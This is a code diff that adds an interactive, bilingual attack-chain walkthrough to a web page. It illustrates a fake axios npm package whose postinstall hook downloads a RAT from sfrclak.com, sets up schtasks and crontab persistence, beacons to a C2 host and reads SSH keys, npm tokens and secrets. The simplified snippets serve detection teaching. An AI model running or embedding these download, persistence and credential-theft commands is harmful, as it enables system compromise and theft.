+    textTR: 'Tehdit akt\u00f6r\u00fc axios@1.14.1\'i olu\u015fturur \u2014 me\u015fru axios\'ta hi\u00e7 var olmayan bir versiyon numaras\u0131 (ger\u00e7ek versiyonlar 1.7.x). package.json postinstall hook\'u, XOR ile gizlenmi\u015f RAT indirme mant\u0131\u011f\u0131 i\u00e7eren install.js\'i \u00e7al\u0131\u015ft\u0131racak \u015fekilde ayarlan\u0131r.',
+    cmd: '// package.json \u2014 malicious\n{\n  "name": "axios",\n  "version": "1.14.1",\n  "scripts": {\n    "postinstall": "node ./scripts/install.js"\n  }\n}\n\n// install.js (XOR obfuscated, simplified):\nconst k = 0x42;\nconst payload = Buffer.from([...]).map(b => b ^ k);\n// payload = RAT downloader code',
+    explain: 'Version numbers like 1.14.1 can fool developers who know axios but don\'t check exact versions. npm\'s semantic versioning means automated tools may "upgrade" to seemingly newer versions.'
+  },
+  {
+    node: 1, conn: 0, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 2 \u2014 npm install Triggers postinstall Hook',
+    stepLabelTR: 'ADIM 2 \u2014 npm install postinstall Hook\'u Tetikler',
+    text: 'When a developer or CI/CD pipeline runs npm install, npm automatically executes postinstall scripts without any user confirmation or warning. The hook runs with full Node.js capabilities.',
+    textTR: 'Bir geli\u015ftirici veya CI/CD pipeline npm install \u00e7al\u0131\u015ft\u0131rd\u0131\u011f\u0131nda, npm herhangi bir kullan\u0131c\u0131 onay\u0131 veya uyar\u0131 olmadan postinstall script\'lerini otomatik olarak \u00e7al\u0131\u015ft\u0131r\u0131r.',
+    cmd: '$ npm install\n\n> axios@1.14.1 postinstall\n> node ./scripts/install.js\n\n# \u2190 install.js now runs SILENTLY\n# User sees only the normal install output\nadded 1 package in 2.341s\n# RAT is already being downloaded',
+    explain: 'npm postinstall hooks are a legitimate feature for build steps. There is no distinction between "trusted" and "untrusted" hooks in npm. --ignore-scripts flag disables all hooks but breaks many legitimate packages.'
+  },
+  {
+    node: 2, conn: 1, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 3 \u2014 OS Fingerprint + RAT Binary Download',
+    stepLabelTR: 'ADIM 3 \u2014 \u0130\u015fletim Sistemi Tespiti + RAT Binary \u0130ndirme',
+    text: 'install.js checks process.platform to identify Windows, Linux, or macOS. Downloads the OS-specific RAT binary from sfrclak.com via HTTPS. XOR-decodes the downloaded payload before writing to disk.',
+    textTR: 'install.js, Windows, Linux veya macOS\'u tan\u0131mlamak i\u00e7in process.platform\'u kontrol eder. HTTPS \u00fczerinden sfrclak.com\'dan i\u015fletim sistemine \u00f6zg\u00fc RAT binary\'yi indirir. \u0130ndirilen payload diske yaz\u0131lmadan \u00f6nce XOR ile decode edilir.',
+    cmd: '// OS detection and download\nconst os = process.platform;\nconst urls = {\n  win32:  \'https://sfrclak.com/d/win/update.exe\',\n  linux:  \'https://sfrclak.com/d/linux/update\',\n  darwin: \'https://sfrclak.com/d/mac/update\'\n};\nhttps.get(urls[os], (res) => {\n  // XOR decode and write to %TEMP% or ~/.local/bin/\n});',
+    explain: 'XOR obfuscation with a single byte key is trivially reversible but defeats simple string-based YARA rules. The HTTPS download uses the system\'s trusted CA store \u2014 it looks like normal package telemetry.'
+  },
+  {
+    node: 3, conn: 2, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 4 \u2014 Persistence + RAT Execution',
+    stepLabelTR: 'ADIM 4 \u2014 Kal\u0131c\u0131l\u0131k + RAT \u00c7al\u0131\u015ft\u0131rma',
+    text: 'Platform-specific persistence: Windows creates a scheduled task named "WindowsUpdate" running every 5 minutes. Linux/macOS adds a crontab entry. RAT starts immediately and establishes baseline on the host.',
+    textTR: 'Platform\'a \u00f6zg\u00fc kal\u0131c\u0131l\u0131k: Windows, her 5 dakikada bir \u00e7al\u0131\u015fan "WindowsUpdate" adl\u0131 bir zamanlanm\u0131\u015f g\u00f6rev olu\u015fturur. Linux/macOS bir crontab giri\u015fi ekler. RAT hemen ba\u015flar ve host\'ta baseline olu\u015fturur.',
+    cmd: '# Windows persistence\nschtasks /create /sc MINUTE /mo 5 \\\n  /tn "WindowsUpdate" \\\n  /tr "%TEMP%\\svchost_update.exe" /f\n\n# Linux/macOS persistence\n(crontab -l 2>/dev/null; echo \\\n  "*/5 * * * * ~/.local/bin/update") | crontab -\n\n# Process name after rename:\n# Windows: svchost_update.exe\n# Linux:   update (mimics system util)',
+    explain: '"WindowsUpdate" scheduled task name is chosen to blend with legitimate Microsoft Update tasks. On Linux, renaming the binary to "update" makes it appear as a routine system utility in process lists.'
+  },
+  {
+    node: 4, conn: 3, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 5 \u2014 C2 Beacon + Credential Exfiltration',
+    stepLabelTR: 'ADIM 5 \u2014 C2 Beacon + Kimlik Bilgisi S\u0131zd\u0131rma',
+    text: 'RAT beacons to sfrclak.com:8000 using fake MSIE 8.0 User-Agent \u2014 an IE8 string from 2009, impossible on modern systems. SSH keys, .npmrc tokens, git credentials, and environment variables are exfiltrated.',
+    textTR: 'RAT, sahte MSIE 8.0 User-Agent kullanarak sfrclak.com:8000\'e beacon g\u00f6nderir \u2014 2009\'dan kalma, modern sistemlerde imkans\u0131z bir IE8 dizisi. SSH key\'ler, .npmrc token\'lar\u0131, git credential\'lar\u0131 ve ortam de\u011fi\u015fkenleri s\u0131zd\u0131r\u0131l\u0131r.',
+    cmd: 'GET /api/status HTTP/1.1\nHost: sfrclak.com:8000\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)\nAccept: */*\n\n# Exfiltration targets:\ncat ~/.ssh/id_rsa           # SSH private keys\ncat ~/.npmrc               # npm auth tokens\ncat ~/.gitconfig           # git credentials\nenv | grep -E "TOKEN|KEY|SECRET|PASS"',
+    explain: 'MSIE 8.0 User-Agent (from Windows XP/Vista era) is an immediate detection signal \u2014 no modern application legitimately sends this string. Any proxy/firewall rule blocking MSIE 8.0 UA from internal hosts is a high-confidence detection.'
+  }
+];
+
+let _atvIdx = -1;
+let _atvTimer = null;
+let _atvAuto = false;
+
+function atvReset() {
+  clearTimeout(_atvTimer);
+  _atvIdx = -1;
+  _atvAuto = false;
+  ATV_NODES.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('active', 'pwned', 'safe');
+  });
+  ATV_CONNS.forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.remove('active', 'danger');
+    const pkt = el.querySelector('.atk-pkt');
+    if (pkt) pkt.classList.remove('run');
+  });
+  document.querySelectorAll('.atk-dot').forEach(d => d.className = 'atk-dot');
+  document.getElementById('atkDetailStep').textContent = '\u25ba SIMULATION READY';
+  document.getElementById('atkDetailText').textContent = 'Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step.';
+  const expl = document.getElementById('atkExplain');
+  if (expl) expl.style.display = 'none';
+  document.getElementById('atkProgLabel').textContent = '0 / ' + ATV_STEPS.length;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u25b6 AUTO'; autoBtn.disabled = false; autoBtn.onclick = atvRun; }
+  const stepBtn = document.getElementById('atkStepBtn');
+  if (stepBtn) { stepBtn.disabled = false; }
+}
+
+function atvRender(idx) {
+  const s = ATV_STEPS[idx];
+  const useTR = (_lang === 'tr');
+
+  // Packet flash reset
+  document.querySelectorAll('.atk-pkt').forEach(p => { p.classList.remove('run'); void p.offsetWidth; });
+
+  // Update node states
+  ATV_NODES.forEach((id, i) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.remove('active', 'pwned', 'safe');
+    if (i === s.node) el.classList.add(s.nodeType || 'active');
+    else if (i < s.node) el.classList.add('safe');
+  });
+
+  // Update connector states
+  ATV_CONNS.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('active', 'danger');
+  });
+  if (s.conn !== null) {
+    const cEl = document.getElementById(ATV_CONNS[s.conn]);
+    if (cEl) {
+      cEl.classList.add(s.connType);
+      const pkt = cEl.querySelector('.atk-pkt');
+      if (pkt) {
+        pkt.className = 'atk-pkt ' + (s.connType === 'danger' ? 'red' : 'orange');
+        setTimeout(() => pkt.classList.add('run'), 80);
+      }
+    }
+  }
+
+  // Update detail panel
+  const stepLabel = useTR ? s.stepLabelTR : s.stepLabel;
+  const text = useTR ? s.textTR : s.text;
+  document.getElementById('atkDetailStep').textContent = stepLabel;
+  document.getElementById('atkDetailText').textContent = text;
+
+  // Update explain panel
+  const expl = document.getElementById('atkExplain');
+  const explText = document.getElementById('atkExplainText');
+  if (s.explain && expl && explText) {
+    explText.textContent = s.explain;
+    expl.style.display = 'block';
+  } else if (expl) {
+    expl.style.display = 'none';
+  }
+
+  // Append command block
+  const detail = document.getElementById('atkDetail');
+  const existing = detail.querySelector('.atk-detail-cmd');
+  if (existing) existing.remove();
+  if (s.cmd) {
+    const cmdDiv = document.createElement('div');
+    cmdDiv.className = 'atk-detail-cmd';
+    const pre = document.createElement('pre');
+    pre.style.cssText = 'margin:0;white-space:pre-wrap;font-size:0.7rem';
+    pre.textContent = s.cmd;
+    cmdDiv.appendChild(pre);
+    detail.appendChild(cmdDiv);
+  }
+
+  // Update progress dots
+  document.querySelectorAll('.atk-dot').forEach((d, i) => {
+    d.className = 'atk-dot' + (i < idx ? ' done' : i === idx ? ' current' : '');
+  });
+  document.getElementById('atkProgLabel').textContent = (idx + 1) + ' / ' + ATV_STEPS.length;
+}
+
+function atvGoTo(idx) {
+  clearTimeout(_atvTimer);
+  _atvAuto = false;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u25b6 AUTO'; autoBtn.disabled = false; autoBtn.onclick = atvRun; }
+
+  if (idx < 0) { atvReset(); return; }
+  if (idx >= ATV_STEPS.length) {
+    if (autoBtn) { autoBtn.textContent = '\u21ba RESTART'; autoBtn.disabled = false; autoBtn.onclick = () => { atvReset(); setTimeout(atvRun, 300); }; }
+    return;
+  }
+  _atvIdx = idx;
+  atvRender(idx);
+}
+
+function atvAutoStep() {
+  if (!_atvAuto) return;
+  _atvIdx++;
+  if (_atvIdx >= ATV_STEPS.length) {
+    _atvAuto = false;
+    const autoBtn = document.getElementById('atkPlayBtn');
+    if (autoBtn) { autoBtn.textContent = '\u21ba RESTART'; autoBtn.disabled = false; autoBtn.onclick = () => { atvReset(); setTimeout(atvRun, 300); }; }
+    return;
+  }
+  atvRender(_atvIdx);
+  _atvTimer = setTimeout(atvAutoStep, 2800);
+}
+
+function atvRun() {
+  atvReset();
+  _atvAuto = true;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u23f8'; autoBtn.disabled = true; }
+  setTimeout(atvAutoStep, 500);
+}
+</script>
+
+</body>
+</html>
